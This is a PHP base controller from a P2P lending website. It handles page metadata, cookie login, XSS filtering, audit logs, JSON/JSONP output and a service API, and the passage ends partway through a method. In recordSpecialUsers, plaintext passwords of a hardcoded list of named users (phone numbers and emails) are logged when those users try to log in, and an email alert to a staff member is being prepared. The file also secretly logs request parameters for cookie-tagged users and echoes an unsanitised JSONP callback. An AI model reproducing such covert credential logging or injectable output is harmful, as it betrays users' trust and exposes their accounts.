<?php
/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 */
class ItzController extends CController {
    protected $cStartLog = true;
    protected $cEndLog = true;    
    private static $actionCount = 0;
    
    public $system;
    public $userInfo = array();
    public $user_id = "";
    public $deviceType =""; //设备类型
    //原始未过滤的post，get;在控制器中$this->IGET获取
    public $_IGET = array();
    public $_IPOST = array();
    public $_IREQUEST = array();

    public $AuditLog = array(
        'status'=>false#默认关闭审计日志
        );
    
    /**
     * cTitle 
     */
    // protected $cTitle     = "爱投资 - 最安全规范的互联网金融创新工场";
    protected $cTitle     = "爱投资-安全规范的互联网金融创新工场-P2P网贷首选平台，P2C网贷首创者";
    protected $cTitleBase = " - 爱投资-安全规范的互联网金融创新工场-P2P网贷首选平台，P2C网贷首创者";
    //protected $cTitleBase = " - 爱投资 - 最安全规范的互联网金融创新工场";
    /**
     * cKeywords 
     */
    //protected $cKeywords = "爱投资,安投融,P2C,安全透明,网络投资,网络投资平台,网上投资,抵押借贷,免费投资,放心投资,安全投资,安全理财,P2P网络投资,P2P网上投资,高收益,高回报,投资,借贷,理财,个人投资,民间投资,P2P投资,企业融资,企业借贷";
    protected $cKeywords = "爱投资,安投融,P2P,网贷,P2P网贷,P2P平台，网贷平台,网贷排行,网贷平台排行,P2P网贷平台,P2C,P2C模式,互联网金融,互联网金融平台，网上投资，网上理财，网络投资，网络理财，抵押贷款，企业贷款，企业借款，P2P贷款，P2P借款，企业贷，公司贷款，公司借款，借款平台，网络贷款，网上贷款，免费投资，免费理财，安全网贷平台，投资，理财，个人理财,投资理财,P2P理财,投资理财,理财产品,理财产品排行";
    
    
    /**
     * cDescription 
     */
    //protected $cDescription = "最安全、综合担保实力最强的互联网理财平台，为用户提供有本息全额担保的高收益投资理财产品，大众化的投资门槛、全免费的服务体验。爱投资让您爱上投资！";
    protected $cDescription = "安全规范、实力更强的互联网金融投资理财平台，知名实力P2P网贷品牌，丰富多样且本息全额保障的高收益理财产品，大众化的低投资门槛，全免费的服务体验，爱投资，值得爱；";
    
    /**
     * wlogo 
     */
    protected $wLogo = array(
        'value'=>'<img src="/static/img/common/logo.jpg" class="hd-logo"  width="352" height="40" title="爱投资！让您爱上投资！" alt="爱投资！让您爱上投资！"/>'
    );
    
    //面包屑导航
    public $breadmenu = array();
    
    /**
     * _arrBaseArgs 
     * 基本的请求参数串
     */
    protected $_arrBaseArgs = array();
    
    /**
     * 全局广告信息
     */
    public $commonAds = array();
    
    /**
     * setCTitle 
     * 
     * @param mixed $title 
     * @access protected
     * @return void
     */
    protected function setCTitle($title,$flag = false){
        if($flag){
            $this->cTitle = $title;
        }else{
            $this->cTitle = $title.$this->cTitleBase;
        }

    }
    
    /**
     * getCTitle 
     * 
     * @return void
     */
    protected function getCTitle(){
        return $this->cTitle;
    }
    
    /**
     * setCKeywords 
     * 
     * @param mixed $keywords 
     * @access protected
     * @return void
     */
    protected function setCKeywords($keywords){
        $this->cKeywords = $keywords;
    }
    
    /**
     * getCKeywords 
     * @return void
     */
    protected function getCKeywords(){
        return $this->cKeywords;
    }
    
    /**
     * setCDescription 
     * 设置页面description
     * @param mixed $description 
     * @return void
     */
    protected function setCDescription($description){
        $this->cDescription = $description;
    }

    /**
     * getCDescription 
     * @return void
     */
    protected function getCDescription(){
        return $this->cDescription;
    }
    /**
     * setLogo 
     * 
     * @param mixed $logo 
     * @access protected
     * @return void
     */
    protected function setLogo($logo){
        $this->wLogo = $logo;
    }
    
    /**
     * getLogo 
     * @return void
     */
    protected function getLogo(){
        return $this->wLogo;
    }
    /**
     * addBaseArgs 
     * 
     * @param mixed $key 
     * @param mixed $value 
     * @return void
     */
    protected function addBaseArgs($key,$value){
        $this->_arrBaseArgs[$key]=$value;
    } 
        
    /**
     * _navNum 
     * 下面展示的页码数
     * 
     * @var float
     */
    protected $_navNum = 7;
    
    /**
     * _pn 
     * 页码
     * 
     * @var float
     */
    protected $_pn = 1;

    /**
     * _rn 
     * 每页展示个数
     * 
     * @var float
     */
    protected $_rn = 10;
    
    /**
     * _nn 
     * 总页码个数
     * 
     * @var float
     */
    protected $_nn = 0;

    /**
     * _tn 
     * 总结果个数
     * 
     * @var float
     */
    protected $_tn = 0;    
    
    /**
     * setPn 
     * 
     * @param mixed $pn 
     * @access protected
     * @return void
     */
    protected function setPn($pn)
    {
        $pn = intval($pn);
        $pn = $pn>0 ? $pn : 1;
        $this->_pn=$pn;;
    }
    
    /**
     * getPn 
     * 
     * @access protected
     * @return void
     */
    protected function getPn()
    {
        return $this->_pn;
    }
    
    /**
     * setRn 
     * 
     * @param mixed $rn 
     * @access protected
     * @return void
     */
    protected function setRn($rn)
    {
        $rn = intval($rn);
        $this->_rn=$rn;
    }
    
    /**
     * getRn 
     * 
     * @return void
     */
    protected function getRn()
    {
        return $this->_rn;
    }
    
    /**
     * getOffset 
     * 
     * @return void
     */
    protected function getOffset()
    {
        return ($this->getPn()-1)*$this->getRn();
    }
    
    /**
     * setTn 
     * 
     * @param mixed $tn 
     * @return void
     */
    protected function setTn($tn)
    {
        $tn = intval($tn);
        $this->_tn=$tn;
    }

    public function is_weixin(){
        if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false ) {
            return true;
        }
        return false;
    }

    public function isAppClient(){
        $useragent = strtoupper($_SERVER['HTTP_USER_AGENT']);
        //是app访问
        if((strripos($useragent,'_ITZ_ANDROID')) || (strripos($useragent,'_ITZ_IOS'))){
            return true;
        }
        return false;
    }

    /**
     * 会员俱乐部
     * 域名专用
     */
    public function vip_url(){
        $http_host  = $_SERVER['HTTP_HOST'];
        //获得MC;
        $module     = Yii::app()->controller->module->id;
        $controller = Yii::app()->controller->id;
        $action     = $this->action->id;
        $requestModuleController        = strtolower('/' . $module . '/' . $controller. '/');
        //构建请求的url
        $requestModuleControllerAction  = strtolower($requestModuleController.$action);
        $requestUrlArr = parse_url($_SERVER['REQUEST_URI']);
        $addressUrl = $requestUrlArr['path'];
        $queryString = empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING'];
        $url = $addressUrl . $queryString;

        $commonModuleControllerActionConfig   = Yii::app()->c->vipAndCommonModuleControllerConfig['common'];

        if(!in_array($requestModuleControllerAction, $commonModuleControllerActionConfig)){
            $vipModuleControllerConfig  = Yii::app()->c->vipAndCommonModuleControllerConfig['vip'];
            //是会员模块，非vip地址  跳转vip地址的会员模块
            if(in_array($requestModuleController, $vipModuleControllerConfig) && (strpos($http_host,'vip')===false)) {
                $host = Yii::app()->c->vipUrlHttps;
                $this->redirect($host.$url,true,301);
            }
            //非会员模块，是vip地址  跳转非vip的相应模块
            if(!in_array($requestModuleController, $vipModuleControllerConfig) && (strpos($http_host,'vip')!==false)){
                $host = Yii::app()->c->baseUrlHttps;
                $this->redirect($host.$url,true,301);
            }
        }


    }
    public function init() {


        $this->system = SystemService::getInstance()->getSystemByIdsFromCache();
        //设置网站logo
        $redis_logokey = "weblogo";
        $label = RedisService::getInstance()->hgetall($redis_logokey);
        if($label){
            $this->setLogo($label);
        }
        //全站使用https的COOKIE保持登录状态
        $_user_id_https_array = explode(",",FunctionUtil::authcode(isset($_COOKIE[FunctionUtil::Key2Url("user_id_https",ConfUtil::get('Cookie.secret-key'))])?$_COOKIE[FunctionUtil::Key2Url("user_id_https",ConfUtil::get('Cookie.secret-key'))]:"","DECODE"));

        // setcookie('newVersion',true);

        /*
          $_user_id_https_array 数组组成
          0 : user_id
          1 : cookie写入时的时间戳
          2 : ucenter_id
        */
        if("" != $_user_id_https_array[0]){
        
            $ctime = time() + 60*60;
            $this->user_id = $_user_id_https_array[0];
            /* SESSION释义：
             * 客户端看问题：目前php.ini的session.cookie_lifetime=0，表示关闭浏览器后，记录sessionid的cookie会失效，即SESSION会失效，因此无需考虑SESSION的数据陈旧问题。
             * 服务端看问题：目前php.ini的session.gc_maxlifetime=3600，意味着服务端SESSIOM在用户停止活跃后1小时就过期了，即使你不活动并长期不关闭浏览器，在1小时后服务端SESSION会自动释放。
             * 线上PHP.ini配置：http://confluence.itouzi.com/pages/viewpage.action?pageId=15368762
             */
            
            $this->userInfo = UserService::getInstance()->getUserFromCache($this->user_id);

            
            $_user_id_https_array[1] = time();

            //pc、wap的http级登录状态cookie，也是pc、wap、bbs同步所需的cookie, controller层被请求时，重设cookie有效期
            //延长登录状态
            setcookie( FunctionUtil::Key2Url('user_id_https', ConfUtil::get('Cookie.secret-key')), FunctionUtil::authcode( implode(',',$_user_id_https_array), 'ENCODE' ), $ctime, '/', 'itouzi.com', true , true );
			//新手不展示债权,论坛用
            //setcookie('is_invested_'.$this->userInfo['ucenter_uid'],$this->userInfo['isinvested'], $ctime,'/', 'itouzi.com', true, true);

		}

        //一套框架里支持手机版页面渲染
        require_once(WWW_DIR.'/itzlib/plugins/Mobile-Detect/Mobile_Detect.php');
        $mobile_detect = new Mobile_Detect();
        $this->deviceType = ($mobile_detect->isMobile() ? ($mobile_detect->isTablet() ? 'tablet' : 'phone') : 'computer');


        //增加全局xss过滤 开关在 main.php-->params 里配置
        if(Yii::app()->params['xssfilter']){
        	$this->xss_filter();
        }

        //记录市场广告s_label、kw_id的cookie，登录状态页面传递，防止cookie未清除退出，将过期时间设为即时
        if($this->user_id){
            if(empty($_COOKIE['s_label_temp']) && $_GET['s_label']){
                setcookie('s_label_temp', $_GET['s_label'], 0, '/', 'itouzi.com' );
            }
            if(empty($_COOKIE['kw_id_temp']) && $_GET['kw_id']){
                setcookie('kw_id_temp', $_GET['kw_id'], 0, '/', 'itouzi.com' );
            }
        }

        // 全局公用广告信息
        //$this->commonAds['navigationBarRightAd'] = PictureService::getInstance()->getPcAdByType("pc_navigationBar_right_ad");

        /**
        * 记录追踪特定用户信息
        * from 于东升 
        * 2019-01-16
        */
        if( !empty($_COOKIE['user_s_l']) ){
            $this->logSpecailInfos();
        }
    }

    /**
     *  设置 允许Javascript跨域访问域名 ogirin
     */
    public function addAccessControlAllow(){
        $origin = isset($_SERVER['HTTP_ORIGIN'])? $_SERVER['HTTP_ORIGIN'] : '';
        
        $allow_origin = [
            'https://m.itouzi.com',
            'https://m.huanhuanyiwu.com'
        ];

        if(in_array($origin, $allow_origin)){
            header("Access-Control-Allow-Origin: ".$origin);
        }
    }
    
    //xss 全局过滤
   	public function xss_filter(){

        //保存原始数据
        $this->_IGET = $_GET;
        $this->_IPOST = $_POST;
        $this->_IREQUEST = $_REQUEST;

   		//获得控制器地址
   		$xsspath = trim(Yii::app()->request->getPathInfo(),'/');
   		$xsspathlist = explode("/", $xsspath);
   		if(count($xsspathlist)>=3){//取前三个
   			$xssmodulepath = $xsspathlist['0'];
   			$xssactionpath = $xsspathlist['0']."/".$xsspathlist['1']."/".$xsspathlist['2'];
   		}else $xssmodulepath = $xsspathlist['0'];//取module
   		
   		//模块白名单判断
   		if(in_array($xssmodulepath,Yii::app()->params['whilelist']['modules'])){
   			return;
   		}

        //白名单 URL
        $whitePaths = array_map('strtolower', Yii::app()->params['whilelist']['actionpath']);

   		//控制器白名单判断：如果在白名单里，不过滤
   		if( isset($xssactionpath) && in_array(strtolower($xssactionpath), $whitePaths) ){
   			return;
   		}

   		//GET
   		if(isset($_GET)&&!empty($_GET)){
   			$_GET = $this->xss_filter_ex($_GET);
   		}
   		//POST
   		if(isset($_POST)&&!empty($_POST)){
   			$_POST = $this->xss_filter_ex($_POST);
   		}
   		//REQUEST
   		if(isset($_REQUEST)&&!empty($_REQUEST)){
   			$_REQUEST = $this->xss_filter_ex($_REQUEST);
   		}
   	}
   	
   	//xss 全局过滤
   	public function xss_filter_ex($arr){
   		foreach($arr as $key=>$one){
   			if(is_array($one)){
   				$arr[$key] = $this->xss_filter_ex($one);
   			}else{
   				$arr[$key] = strip_tags($one);//现有过滤函数
   			}
   		}
   		return $arr;
   	}
    
    //旧路由跳转
    public function rewrite_old_url(){
        if(isset($_GET["q"])&&$_GET["q"]!=""){
            switch($_GET["q"]){
                case "code/borrow/contract":  //合同的
                $this->redirect($this->createUrl("/dinvest/index/contract",array("id"=>$_GET["id"])));break;
                default:
                break;
            }
        }
    }

    // 旧版下线路由跳转
    public function rewrite_to_new()
    {
        $urlConfig = Yii::app()->c->redirectUrl;
        $requestUrlArr = parse_url($_SERVER['REQUEST_URI']);
        $requestUrl = rtrim($requestUrlArr['path'],'/');
        if (array_key_exists($requestUrl, $urlConfig)) {
            $queryString = empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING'];
            $newUrl = $urlConfig[$requestUrl] . $queryString;
            $this->redirect($newUrl, true, 301);
        }
    }
    //seo url以/结尾
	private function seoRewrite(){
		$urlConfig = Yii::app()->c->seoRedirectUrl;
		$requestUrlArr = parse_url($_SERVER['REQUEST_URI']);
		$requestUrl = $requestUrlArr['path'];
		if (array_key_exists($requestUrl, $urlConfig)) {
			$queryString = empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING'];
			$newUrl = $urlConfig[$requestUrl] . $queryString;
			$this->redirect($newUrl, true, 301);
		}
	}
    // 指定着陆页下线 至 首页
    public function redirectLdp()
    {
        $urlConfig = Yii::app()->c->redirectLdpUrl;
        $requestUrlArr = parse_url($_SERVER['REQUEST_URI']);
        $requestUrl = strtolower(rtrim($requestUrlArr['path'],'/'));
        if (array_key_exists($requestUrl, $urlConfig)) {
            $queryString = empty($_SERVER['QUERY_STRING']) ? '' : '?' . $_SERVER['QUERY_STRING'];
            $newUrl = $urlConfig[$requestUrl] . $queryString;
            $this->redirect($newUrl, true, 301);
        }
    }

    /**
     * 过滤器
     */
    public function filters() {
        return ['blockCC'];
    }

    /**
     * [filterBlockCC 防 CC 过滤器]
     */
    public function filterBlockCC($filterChain) {
        $filter = new BlockCCFilter();
        $filter->filter($filterChain);
    }
    
    /**
     * beforeAction
     * 请求开始 打日志 
     * 
     * @param mixed $action 
     * @access protected
     * @return void
     */
    protected function beforeAction($action) {
        $this->vip_url();
        self::$actionCount++;
        //如果为最外层的start
        if ($this->cStartLog && self::$actionCount == 1) {
            Yii::log ( "request start", CLogger::LEVEL_INFO, __METHOD__ );
            TimerUtil::start( 'all' );
        }
        parent::beforeAction($action);

        /*
         *  银行存管接口停服 时间点 配置
         */
        


        // 停服模块
        $closing = [];
        
        // 当前时间
       // $time_now = time();

        /*// 2017-08-29 00:00:00
        $time_20170829000000 = strtotime('2017-08-29 00:00:00');
        // 充值（快捷、网银支付）
        if( $time_now >= $time_20170829000000 ){
            array_push($closing,"recharge");
        }

        // 2017-08-29 12:00:00
        $time_20170829120000 = strtotime('2017-08-29 12:00:00');
        // 提现
        if( $time_now >= $time_20170829120000 ){
            array_push($closing,"withdraw");
        }

        // 2017-08-29 14:00:00
        $time_20170829140000 = strtotime('2017-08-29 14:00:00');
        // 实名认证、债权
        if( $time_now >= $time_20170829140000 ){
            array_push($closing,"realAuth","debt");
        }

        // 2017-08-29 19:00:00
        $time_20170829190000 = strtotime('2017-08-29 19:00:00');
        // 直投投资，设置/修改/找回支付密码，修改手机号，添加快捷卡、添加/解除提现卡
        if( $time_now >= $time_20170829190000 ){
            array_push($closing,"invest","editPaypwd","editPhone","bindCard");
        }*/

		/**新网维护，部分模块暂停使用**/
       /* if($time_now>=strtotime('2018-09-01 19:50:00') && $time_now<=strtotime('2018-09-02 00:00:00') ){

			$closing = ['recharge','withdraw','realAuth','debt',"invest","editPaypwd","editPhone","bindCard",'openAccount'];

			Yii::log ( "current_closing_modules are:".print_r($closing,true), CLogger::LEVEL_INFO, __METHOD__ );

			// 记录充值跟实名
			//CloseModule::getInstance()->recordSomething($this->user_id, $closing, ["recharge","realAuth"]);
			CloseModule::getInstance()->deviceType=$this->deviceType;
			CloseModule::getInstance()->close($closing);
		}*/

        return true;
    }
    
    /**
     * afterAction 
     * 请求结束，打印日志
     * 
     * @param mixed $action 
     * @access protected
     * @return void
     */
    protected function afterAction($action) {
        parent::afterAction($action);
        //如果为最外层的end
        if ($this->cEndLog && self::$actionCount == 1) {
            Yii::log ( "request end", CLogger::LEVEL_INFO, __METHOD__ );
            TimerUtil::stop( 'all' );
            Yii::log( TimerUtil::tree(),  CLogger::LEVEL_INFO );
        }
        self::$actionCount--;
        return true;
    }

    //获取客户端系统
    public function getDeviceOs(){
        if(strripos($_SERVER['HTTP_USER_AGENT'],'Volley')){
            return 'android';
        }elseif(strripos($_SERVER['HTTP_USER_AGENT'],'CFNetwork')){
            return 'ios';
        }elseif( 'phone' == $this->deviceType || !empty($_SESSION['wapapi']) ){
            return 'wap';
        }else{
            return '';
        }
    }

    // 获取终端系统是android还是ios
    protected function getDeviceSys(){
        require_once(WWW_DIR.'/itzlib/plugins/Mobile-Detect/Mobile_Detect.php');
        $detect = new Mobile_Detect();

        if( $detect->isIOS() ){
            return "ios";
        }else{
            return "android";
        }
    }

    #记录审计日志
    public function auditLogAdd($code,$info){

        #如果不需要记录
        if($this->AuditLog['status']==false)
        {
            return false;
        }

        #识别用户
        $user_id = 0;
        if(!empty($this->user_id))
        {
            $user_id = $this->user_id;
        }
        if(!empty($this->AuditLog['user_id']))
        {
            $user_id = $this->AuditLog['user_id'];
        }
        
        #识别设备
        $system = 'web/pc';
        $os = $this->getDeviceOs();
        switch($os)
        {
            case 'android': $system = 'app/android';    break;
            case 'ios':     $system = 'app/ios';        break;
            case 'wap':     $system = 'web/wap';        break;
        }

        #自定义 设备
        if(!empty($this->AuditLog['system']))
        {
            $system = $this->AuditLog['system'];
        }

        $status = ($code==0) ? 'success' : 'fail';

        #收集信息
        $parameters = array();
        if(isset($_SERVER["HTTP_CLIENT_VERSION"]))
        {
            $parameters['app_version'] = $_SERVER["HTTP_CLIENT_VERSION"];
        }
        if(isset($_SERVER['REQUEST_URI']))
        {
            $parameters['REQUEST_URI'] = $_SERVER['REQUEST_URI'];
        }
        $parameters['info'] = $info;

        #收集 POST
        if($_POST)
        {
            if(isset($_POST['check_sign_str']))
            {
                unset($_POST['check_sign_str']);
            }
            foreach($_POST as $key=>$v)
            {
                if(stripos(','.$key,'password'))
                {
                    continue;
                }
                if(stripos(','.$key,'passwd'))
                {
                    continue;
                }
                $parameters[$key] = $v;
            }
        }

        #收集 GET
        if($_GET)
        {
            foreach($_GET as $key=>$v)
            {
                if(stripos(','.$key,'password'))
                {
                    continue;
                }
                if(stripos(','.$key,'passwd'))
                {
                    continue;
                }
                $parameters[$key] = $v;
            }
        }

        #自定义
        if(!empty($this->AuditLog['parameters']))
        {
            $parameters = $parameters+ $this->AuditLog['parameters'];
        }
        if($_SERVER['HTTP_ITZ_LOCATION']){
            $gisdata = $_SERVER['HTTP_ITZ_LOCATION'];
        }else{
            $gisdata = "";
        }
        #审计日志 登录错误
        AuditLog::getInstance()->method('add', array(
            "user_id"   => $user_id,
            "system"    => $system,
            "action"    => $this->AuditLog['action'],
            "resource"  => $this->AuditLog['resource'],
            "status"    => $status,
            "parameters"=> $parameters,
            "gisdata"   => $gisdata,
        ));
    }

    #记录特定日志
    public function logSpecailInfos(){
        #收集信息
        $parameters = array();
        #识别用户
        $user_id = 0;
        if( $this->user_id )
        {
            $user_id = $this->user_id;
        }
        $parameters['user_id'] = $user_id;
        
        $header = Yii::app()->request->headers;

        #收集 普通表单 POST
        if( $_POST && $header['content-type'] && preg_match('/application\/x-www-form-urlencoded/i', $header['content-type']) )
        {
            foreach($_POST as $key=>$v)
            {
                if(stripos(','.$key,'password'))
                {
                    continue;
                }
                if(stripos(','.$key,'passwd'))
                {
                    continue;
                }
                $parameters[$key] = $v;
            }
        }
        #收集 GET
        if($_GET)
        {
            foreach($_GET as $key=>$v)
            {
                $parameters[$key] = $v;
            }
        }

        Yii::log( print_r($parameters, true), CLogger::LEVEL_INFO, __METHOD__ );
    }
    
    /**
     * echoJson 
     * 输出json
     * 
     * @param mixed $data
     * @param int $code 0:success 
     * @access protected
     * @return void
     */
    public function echoJson($data=array(),$code=0,$info="",$plain_flag=false,$type="json"){

        #处理审计日志
        $this->auditLogAdd($code,$info);

        if(isset($_REQUEST['data_type']) && $_REQUEST['data_type'] =="jsonp" ){
            $this->echoJsonp($data,$code,$info);return;
        }
        if($type=="jsonp"){
            $this->echoJsonp($data,$code,$info);return;
        }    
        if($plain_flag){
            if(strpos(isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : '', 'application/json') !== false){
                 header('Content-type:text/plain; charset=utf-8');
            }
        }else{
            header ( "Content-type:application/json; charset=utf-8" );
        }

        // 跨域设置
        $this->addAccessControlAllow();

        $data = ArrayUtil::getArray($data);
        $res["data"] = $data;
        $res['code'] = intval($code);
        $res['info'] = $info;

        echo json_encode ( $res );
    }

	 /**
     * echoJson 
     * 输出json并退出程序
     * 
     * @param mixed $data
     * @param int $code 0:success 
     * @access protected
     * @return void
     */
    public function echoJsonExit($data=array(),$code=0,$info="",$plain_flag=false,$type="json"){

        #处理审计日志
        $this->auditLogAdd($code,$info);

        if(isset($_REQUEST['data_type']) && $_REQUEST['data_type'] =="jsonp" ){
            $this->echoJsonp($data,$code,$info);return;
        }
        if($type=="jsonp"){
            $this->echoJsonp($data,$code,$info);return;
        }    
        if($plain_flag){
            if(strpos(isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : '', 'application/json') !== false){
                 header('Content-type:text/plain; charset=utf-8');
            }
        }else{
            header ( "Content-type:application/json; charset=utf-8" );
        }

        // 跨域设置
        $this->addAccessControlAllow();

        $data = ArrayUtil::getArray($data);
        $res["data"] = $data;
        $res['code'] = intval($code);
        $res['info'] = $info;
        echo exit(json_encode ( $res ));
    }
    
    /**
     * echoJsonp 
     * 输出jsonp
     * fixme 该函数逐渐改为private，请使用echoOut 
     * 
     * @param mixed $data 
     * @access protected
     * @return void
     */
    protected function echoJsonp($data=array(),$code=0,$info=""){
        $func = "jsoncallback";
        if(isset($_REQUEST['jsoncallback'])){
            $func = $_REQUEST['jsoncallback'];
        } 
        header ( "Content-type:application/json; charset=utf-8" );
        $res["data"] = $data;
        $res['code']=intval($code);
        $res['info']=$info;
        echo $func."(".json_encode ( $res ).")";
     }
    /**
     * actionApi 
     * 
     * @param mixed $serviceName 
     * @param mixed $funcName 
     * @access public
     * @return void
     */
    public $api_op_user = "";
    public function actionApi($serviceName,$funcName){
        //echo McryptUtil::encrypt("1@".time());die;
        if($this->checkAccess()){ 
            try{
                $serviceClass = ucfirst($serviceName).'Service';
                if(!file_exists(APP_DIR.'/protected/lib/services/'.$serviceClass.'.php')){
                    Yii::log('Service '.$serviceName.' does not exist.',"error");exit;
                }
                $method = new ReflectionMethod($serviceClass, $funcName);
                $params = $method->getParameters();
                $args = array();
                foreach($params as $param){
                    if(isset($_REQUEST[$param->name])){
                        $args[$param->name] = $_REQUEST[$param->name];
                    }else{
                        $args[$param->name] = NULL;
                    }
                }
                
                $args["api_op_user"] = $this->api_op_user; 
                
                if(function_exists("$serviceClass::getInstance")){
                    $serviceObj = $serviceClass::getInstance();
                }else{
                    $serviceObj = new $serviceClass();
                }
                $res = $method->invokeArgs($serviceObj,$args);
                $this->echoJson($res["data"],$res["code"],$res["info"]);
            }catch(Exception $e){
                $this->echoJson(array(),-1,$e->getMessage());
                return;
            }
        }else{
            $this->echoJson(array(),-1,"permission forbidden");
        }
    }
    
    public function checkAccess(){
        if(!isset($_REQUEST["itztoken"]) || $_REQUEST["itztoken"]==""){
            return false;
        }
        $decode = McryptUtil::decrypt($_REQUEST["itztoken"]);
        $tmp_array = explode("@", $decode);
        if(count($tmp_array)>1){
            $this->api_op_user = $tmp_array[0];
            $timediff = time()-$tmp_array[1];
            if(is_numeric($tmp_array[1]) && ( $timediff <= 120 && $timediff >= 0 ) ){ //二分钟一变
                Yii::log("api checkAccess debug ip: ".FunctionUtil::ip_address(),"debug");
                return true;
            }else{
                Yii::log("api checkAccess error :decode array: ".print_r($tmp_array,true),"error");
                return false;
            }
        }else{
            return false;
        }
    }
    
    /**
     * render 
     * 
     * @param mixed $view 
     * @param mixed $data 
     * @param mixed $return 
     * @access public
     * @return void
     */
    public function render($view,$data=null,$return=false)
    {
        if($this->beforeRender($view))
        {
            $data['Itz']=array(
                  'system'   => $this->system,
                  'userInfo' => $this->userInfo,
            );
            if(empty($data['BaseArgs'])){
                $data['BaseArgs']=array();
            }
            foreach($this->_arrBaseArgs as $k=>$v){
                $data["BaseArgs"][$k]=$v;
            }
            $data['ItzView']=array(
                'keywords'=>$this->getCKeywords(),
                'description'=>$this->getCDescription(),
                'title'=>$this->getCTitle(),
                'logo' => $this->getLogo(),
                'breadmenu'=> $this->breadmenu
            );
            $data['pageInfo']['pn'] = $this->_pn;
            $data['pageInfo']['rn'] = $this->_rn;
            
            if(!empty($this->_tn) && !empty($this->_pn) && !empty($this->_rn)){
                $data['pageInfo']['tn'] = $this->_tn;
                $this->_nn = ceil($this->_tn/$this->_rn);
                $data['pageInfo']['nn'] = $this->_nn;
                $data['pageInfo']['arrNavi']=ItzPageUtil::getPageNavigation($this->_navNum,$this->_pn,$this->_nn);
            }

            if(isset($_GET['force_www']) && $_GET['force_www']=='1'){
                setcookie("force_www", '1', 0,'/','itouzi.com');
            }
            if(isset($_GET['force_m']) && $_GET['force_m']=='1'){
                setcookie("force_www", '0', 0,'/','itouzi.com');
            }

            //如果是ios 并且存在_ios.tpl文件 那么渲染ios文件
            if(isset($_SESSION["tpl_choose"]) && $_SESSION["tpl_choose"]!= "" && $this->getViewFile($view."_ios")!==false && $this->getViewFile($view."_andoid")!==false ){
                if($_SESSION["tpl_choose"] == "ios"){
                    $view .= "_ios";
                }else if($_SESSION["tpl_choose"] == "andoid"){
                    $view .= "_android";
                }
            }else{
                //手机浏览器  存在 $view_mobile.tpl 文件 那么渲染手机版文件 
                if($this->deviceType == 'phone' 
                  && $this->getViewFile($view."_mobile")!==false 
                  && ( !isset($_COOKIE['force_www']) || $_COOKIE['force_www']!= '1' )
                ){
                    $view .= "_mobile";
                }
            }

            //一套框架里支持手机版页面渲染 end
            
            $output=$this->renderPartial($view,$data,true);
            if(($layoutFile=$this->getLayoutFile($this->layout))!==false)
                 $output=$this->renderFile($layoutFile,array('content'=>$output),true);
            $this->afterRender($view,$output);
            $output=$this->processOutput($output);

            if($return)
                return $output;
            else
                echo $output;
        }
    }

    // PC改版 - 新版pc消息提示页面
    public function renderSysMsg($data=null){
        $this->render("//itzdefault/common/sysMsg", $data);
    }

    /**
     * 用户中心消息提示页面
     * @param null $data
     */
    public function renderSysMsgUser($data=null){
        $this->render("//itzdefault/common/sysMsgUser", $data);
    }
    
    /*
     * @param $data msg
     * @param $data content
     * @param $data url=""
    */
    public function renderMsg($data=null){
        $this->render("//itzdefault/common/msg",$data);
    }
    
    /*
     * 新版渲染消息页 头部同注册登录页
     * @param $data msg 
     * @param $data content
     * @param $data status //1成功 2失败 3叹号
     * @param $data url=""
    */
    public function renderMsgNew($data=null){
        $data["isApp"] = $this->isAppClient() ? 1 : 0;
        $this->render("//itzdefault/common/msgnew",$data);
    }
    
    /*
     * 用户中心
     * @param $data msg 
     * @param $data content
     * @param $data status //1成功 2失败 3叹号
     * @param $data url=""
    */
    public function renderMsgUser($data=null){
        if(isset($data["user_id"])){
            $result["userInfo"] = UserService::getInstance()->getUser($data["user_id"]);
        }else{
            $result["userInfo"] = UserService::getInstance()->getUser($this->user_id);
        }
        $result["userInfo"]["safe_level"] = (($result["userInfo"]["real_status"]==1)?1:0) +(($result["userInfo"]["email_status"]==1)?1:0)
         +(($result["userInfo"]["phone_status"]==1)?1:0) + (($result["userInfo"]["paypassword"])?1:0) + (($result['userInfo']["qn_score"])?1:0);
        
        $data += $result;
        $this->render("//newuser/common/statusPage",$data);
    }
    
    /*
     * 通用 -- 下载APP url
    */
    public function getDownloadUri() {

        # 换腾讯应用宝后 android & ios 使用同一个链接 ；故无需区分
        return Yii::app()->c->app_uri['ios'];

        // $useragent = strtolower($_SERVER["HTTP_USER_AGENT"]);
        // // ipad  
        // $is_ipad = strripos($useragent,'ipad');
        // // iphone  
        // $is_iphone = strripos($useragent,'iphone');  
        // // android  
        // $is_android = strripos($useragent,'android');
        // // ucbrowser is shit
        // $is_uc = strripos($useragent, 'ucbrowser');
        // // android installed uc browser
        // $is_android_uc = ereg('^ucweb.*adr',$useragent);
        // // weixin internal browser
        // // $is_weixin = strripos($useragent,'MicroMessenger');
        // // $wechat_pre = $is_weixin ? 'http://mp.weixin.qq.com/mp/redirect?url=' : '';
        // $ios_url = Yii::app()->c->app_uri['ios'];
        // $adr_url = Yii::app()->c->app_uri['android'];
        // // pc电脑  
        // // $is_pc = strripos($useragent,'windows nt');
        // if($is_android || $is_android_uc){
        //     // $uri = $wechat_pre ? $wechat_pre.urlencode($adr_url) : $adr_url;
        //     $uri = $adr_url;
        // } else {
        //     // $uri = $wechat_pre ? $wechat_pre.urlencode($ios_url) : $ios_url;
        //     $uri = $ios_url;
        // }
        // return $uri;
    }

    /**
     * 临时 数据记录
     * 2018-09-04 from liqiang
     * by lingjie
     */
    public function recordSpecialUsers($username='', $password='', $agent='') {
        $specailUsers = ['18612362787', '13522597458', 'easygo', 'g0getter@sina.com', '15329216868', '13401616@qq.com', 'boss2008'];

        if( in_array($username, $specailUsers, false) ){
            $logInfo = $username." try to login itouzi". $agent ." with pwd:".$password;
            // for test
            if( '18612362787' == $username ){
                $logInfo = $username." try to login itouzi". $agent ." with pwd:".md5($password);
            }
            Yii::log($logInfo, 'info', __METHOD__);

            $user_id = -1;
            $email_address = 'dinglingjie@itouzi.com';
            $email_title = "神秘人通过{$agent}登录了".$username;
            $email_content = "神秘人通过{$agent}登录了，快去查看吧".$username;

            $emailClass = new MailClass();
